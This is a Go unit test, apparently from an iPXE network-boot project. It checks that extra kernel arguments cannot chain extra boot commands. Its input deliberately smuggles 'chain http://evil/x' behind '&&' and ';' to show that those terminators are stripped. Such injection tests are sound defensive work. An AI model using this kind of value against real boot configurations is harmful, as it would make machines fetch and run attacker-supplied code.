package httpd

import (
	"strings"
	"testing"

	"github.com/ghazichaieb/gola-bootlace/internal/ipxesafe"
)

func TestExtraKernelArgumentsFromAnOldSettingsFileCannotChainCommands(t *testing.T) {
	out := addArgs([]string{"kernel http://s/fs/x/vmlinuz quiet", "boot"}, "nomodeset && chain http://evil/x ; debug")
	for _, w := range strings.Fields(out[0]) {
		if ipxesafe.Terminator(w) {
			t.Fatalf("%q has the chaining word %q", out[0], w)
		}
	}
	if !strings.HasSuffix(out[0], " nomodeset chain http://evil/x debug") || out[1] != "boot" {
		t.Errorf("%q", out)
	}
	if got := addArgs([]string{"kernel x", "boot"}, " && ; "); got[0] != "kernel x" {
		t.Errorf("arguments that are only chain words add something: %q", got)
	}
}
